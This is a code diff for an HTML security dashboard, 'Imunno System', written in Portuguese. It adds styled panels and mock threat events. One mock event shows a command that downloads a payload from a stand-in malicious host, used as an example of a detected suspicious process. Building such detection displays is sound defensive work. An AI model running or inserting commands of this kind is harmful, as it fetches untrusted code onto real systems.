@@ -3,32 +3,230 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard | Sistema Imunno</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Imunno System - Painel de Ameaças</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Roboto+Mono:wght@300;400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --glow-color: #00aaff;
+            --secondary-glow-color: #ff4500;
+            --background-color: #050a14;
+            --text-color: #e0e0e0;
+            --text-glow: #c0c0c0;
+        }
+
+        body {
+            background-color: var(--background-color);
+            color: var(--text-color);
+            font-family: 'Roboto Mono', monospace;
+            overflow-x: hidden;
+        }
+
+        .font-orbitron {
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .glass-panel {
+            background: rgba(10, 25, 47, 0.5);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 170, 255, 0.2);
+            box-shadow: 0 0 15px rgba(0, 170, 255, 0.1);
+        }
+
+        .glow-text {
+            text-shadow: 0 0 5px var(--glow-color), 0 0 10px var(--glow-color);
+        }
+        
+        .glow-text-red {
+            color: #ff3b3b;
+            text-shadow: 0 0 5px #ff3b3b, 0 0 10px #ff3b3b;
+        }
+        
+        .glow-text-orange {
+            color: #ff8c00;
+            text-shadow: 0 0 5px #ff8c00, 0 0 10px #ff8c00;
+        }
+
+        .glow-text-green {
+            color: #39ff14;
+            text-shadow: 0 0 5px #39ff14, 0 0 10px #39ff14;
+        }
+
+        .grid-lines {
+            background-image:
+                linear-gradient(rgba(0, 170, 255, 0.1) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 170, 255, 0.1) 1px, transparent 1px);
+            background-size: 2rem 2rem;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: -1;
+            opacity: 0.5;
+        }
+        
+        .scan-line {
+            position: absolute;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: var(--glow-color);
+            box-shadow: 0 0 10px var(--glow-color);
+            animation: scan 8s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { top: 0%; }
+            100% { top: 100%; }
+        }
+        
+        .threat-item {
+            border-left: 2px solid;
+            transition: all 0.3s ease;
+        }
+        
+        .threat-item:hover {
+            background: rgba(0, 170, 255, 0.1);
+        }
+    </style>
 </head>
-<body>
-    <header>
-        <h1>Dashboard de Segurança Imunno</h1>
-        <div class="status-light" id="status-light"></div>
+<body class="p-4 md:p-8 relative">
+    <div class="grid-lines"></div>
+    <div class="scan-line"></div>
+
+    <header class="flex justify-between items-center mb-8">
+        <h1 class="text-3xl md:text-4xl font-orbitron glow-text">IMUNNO_SYSTEM</h1>
+        <div class="flex items-center space-x-4">
+            <div id="status-light" class="w-4 h-4 rounded-full bg-green-500 shadow-[0_0_10px_#39ff14]"></div>
+            <span id="status-text" class="font-orbitron text-lg glow-text-green">SISTEMA OPERACIONAL</span>
+        </div>
     </header>
 
-    <main>
-        <h2>Log de Eventos em Tempo Real</h2>
-        <table>
-            <thead>
-                <tr>
-                    <th>Horário</th>
-                    <th>Origem</th>
-                    <th>Agente</th>
-                    <th>Detalhes da Análise</th>
-                    <th>Pontuação</th>
-                </tr>
-            </thead>
-            <tbody id="events-log">
-                </tbody>
-        </table>
+    <main class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+        <!-- Coluna de Eventos -->
+        <div class="lg:col-span-2 glass-panel rounded-lg p-6">
+            <h2 class="text-xl font-orbitron mb-4 border-b border-[var(--glow-color)] pb-2 glow-text">LOG DE EVENTOS EM TEMPO REAL</h2>
+            <div id="events-log" class="space-y-4 h-[60vh] overflow-y-auto pr-2">
+                <!-- Eventos serão inseridos aqui pelo JavaScript -->
+            </div>
+        </div>
+
+        <!-- Coluna de Métricas -->
+        <div class="glass-panel rounded-lg p-6 space-y-6">
+            <div>
+                <h2 class="text-xl font-orbitron mb-2 glow-text">MÉTRICAS DA REDE</h2>
+                <div class="bg-black/30 p-4 rounded">
+                    <p>Agentes Ativos: <span id="active-agents" class="font-bold text-2xl glow-text-green">1</span></p>
+                    <p>Eventos Hoje: <span id="events-today" class="font-bold text-2xl glow-text">1,284</span></p>
+                    <p>Ameaças Neutralizadas: <span id="threats-neutralized" class="font-bold text-2xl glow-text-orange">3</span></p>
+                </div>
+            </div>
+            <div>
+                <h2 class="text-xl font-orbitron mb-2 glow-text">ESTADO DO SISTEMA</h2>
+                <div class="bg-black/30 p-4 rounded space-y-2">
+                    <div class="flex justify-between"><span>CPU</span><div class="w-2/3 bg-gray-700 rounded-full h-2.5"><div class="bg-cyan-400 h-2.5 rounded-full" style="width: 45%"></div></div></div>
+                    <div class="flex justify-between"><span>Memória</span><div class="w-2/3 bg-gray-700 rounded-full h-2.5"><div class="bg-cyan-400 h-2.5 rounded-full" style="width: 65%"></div></div></div>
+                    <div class="flex justify-between"><span>Análise IA</span><span class="glow-text-green">ONLINE</span></div>
+                </div>
+            </div>
+            <div>
+                <h2 class="text-xl font-orbitron mb-2 glow-text">ÚLTIMA AMEAÇA</h2>
+                <div id="last-threat" class="bg-black/30 p-4 rounded break-words">
+                    <p class="text-orange-400">AMEAÇA_NOVA.PHP</p>
+                    <p class="text-xs text-gray-400">Detecção: Execução de Comando</p>
+                </div>
+            </div>
+        </div>
     </main>
 
-    <script src="script.js"></script>
+    <script>
+        const eventsLog = document.getElementById('events-log');
+        const statusLight = document.getElementById('status-light');
+        const statusText = document.getElementById('status-text');
+
+        // Dados de exemplo para simulação
+        const mockEvents = [
+            { source: 'file', threat_score: 90, details: "AMEAÇA DETECTADA: /data/apocalypse.php", timestamp: new Date().toISOString() },
+            { source: 'file', threat_score: 0, details: "Arquivo seguro verificado: /data/wp-includes/version.php", timestamp: new Date().toISOString() },
+            { source: 'process', threat_score: 50, details: "Processo suspeito: wget http://malicious.com/payload", timestamp: new Date().toISOString() },
+            { source: 'file', threat_score: 0, details: "Arquivo seguro verificado: /data/wp-admin/admin.php", timestamp: new Date().toISOString() },
+        ];
+
+        function getThreatColor(score) {
+            if (score > 75) return 'border-red-500';
+            if (score > 40) return 'border-orange-500';
+            if (score > 0) return 'border-yellow-500';
+            return 'border-cyan-500';
+        }
+
+        function getThreatTextColor(score) {
+            if (score > 75) return 'text-red-400';
+            if (score > 40) return 'text-orange-400';
+            if (score > 0) return 'text-yellow-400';
+            return 'text-cyan-300';
+        }
+
+        function addEventToLog(event) {
+            const eventElement = document.createElement('div');
+            const colorClass = getThreatColor(event.threat_score);
+            const textColorClass = getThreatTextColor(event.threat_score);
+            
+            const time = new Date(event.timestamp).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+
+            eventElement.className = `threat-item p-3 ${colorClass} bg-black/20 rounded-r-lg`;
+            eventElement.innerHTML = `
+                <div class="flex justify-between items-center">
+                    <span class="font-bold ${textColorClass} text-sm md:text-base break-all">${event.details}</span>
+                    <span class="text-xs text-gray-400 whitespace-nowrap pl-4">${time}</span>
+                </div>
+            `;
+            
+            eventsLog.prepend(eventElement);
+            
+            // Mantém o log com um número máximo de itens
+            if (eventsLog.children.length > 50) {
+                eventsLog.removeChild(eventsLog.lastChild);
+            }
+
+            // Pisca a luz de status para ameaças
+            if(event.threat_score > 40) {
+                statusLight.className = 'w-4 h-4 rounded-full bg-red-500 shadow-[0_0_10px_#ff3b3b] animate-pulse';
+                statusText.className = 'font-orbitron text-lg glow-text-red';
+                statusText.textContent = 'AMEAÇA DETECTADA';
+            }
+        }
+        
+        // Simulação de recebimento de eventos
+        let eventIndex = 0;
+        setInterval(() => {
+            const newEvent = mockEvents[eventIndex % mockEvents.length];
+            newEvent.timestamp = new Date().toISOString();
+            addEventToLog(newEvent);
+            eventIndex++;
+            
+            // Reseta o status para normal após um tempo
+            if(statusText.textContent !== 'SISTEMA OPERACIONAL') {
+                setTimeout(() => {
+                    statusLight.className = 'w-4 h-4 rounded-full bg-green-500 shadow-[0_0_10px_#39ff14]';
+                    statusText.className = 'font-orbitron text-lg glow-text-green';
+                    statusText.textContent = 'SISTEMA OPERACIONAL';
+                }, 3000);
+            }
+        }, 4000);
+
+        // Função para buscar dados reais (a ser implementada)
+        async function fetchData() {
+            // const response = await fetch('http://localhost:8181/api/v1/events');
+            // const data = await response.json();
+            // data.forEach(addEventToLog);
+        }
+
+        // fetchData();
+        // setInterval(fetchData, 5000);
+    </script>
 </body>
 </html>
